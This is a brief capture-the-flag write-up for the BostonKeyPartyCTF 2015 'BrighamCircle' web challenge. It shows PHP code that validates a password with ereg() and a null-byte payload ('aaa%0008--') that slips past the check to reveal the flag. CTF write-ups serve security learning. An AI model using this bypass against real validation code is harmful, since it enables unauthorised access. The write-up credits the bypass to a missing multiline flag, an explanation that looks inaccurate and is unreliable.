---
title: "BrighamCircle - BostonKeyPartyCTF 2015"
category: "web"
subcategory: "web"
type: "writeup"
tags: ["web", "brighamcircle", "web-exploitation", "bostonkeypartyctf", "bl4de", "ctf"]
summary: "Sanitization is hard, lets use regexp!"
source:
  name: "bl4de/ctf"
  url: "https://github.com/bl4de/ctf/blob/7e48b1a697a898ac7a1e6856a91041afa529a8be/2015/BostonKeyPartyCTF_2015/BrighamCircle.md"
ctf:
  name: "BostonKeyPartyCTF"
  year: 2015
  challenge: "BrighamCircle"
---

## Source

- **CTF:** BostonKeyPartyCTF 2015
- **Challenge:** BrighamCircle
- **Repository:** [bl4de/ctf](https://github.com/bl4de/ctf)
- **File:** <https://github.com/bl4de/ctf/blob/7e48b1a697a898ac7a1e6856a91041afa529a8be/2015/BostonKeyPartyCTF_2015/BrighamCircle.md>

---
# Brigham Circle
---
Sanitization is hard, lets use regexp! : 25


## Source code

```
<html>
<head>
	<title>level6</title>
    <link rel='stylesheet' href='style.css' type='text/css'>
</head>
<body>

<?php
require 'flag.php';

if (isset ($_GET['password'])) {
	if (ereg ("^[a-zA-Z0-9]+$", $_GET['password']) === FALSE)
		echo '<p class="alert">You password must be alphanumeric</p>';
	else if (strpos ($_GET['password'], '--') !== FALSE)
		die('Flag: ' . $flag);
	else
		echo '<p class="alert">Invalid password</p>';
}
?>

<section class="login">
        <div class="title">
                <a href="https://raw.githubusercontent.com/bl4de/ctf/7e48b1a697a898ac7a1e6856a91041afa529a8be/2015/BostonKeyPartyCTF_2015/index.txt">Level 6</a>
        </div>

        <form method="get">
                <input type="text" required name="password" placeholder="Password" /><br/>
                <input type="submit"/>
        </form>
</section>
</body>
</html>
```

## Solution

Regexp without m flag (multiline) does not validate something like this:

```
aaa%0008--
```

This will pass filter with ereg() function.

http://52.10.107.64:8006/?password=aaaa%0008--
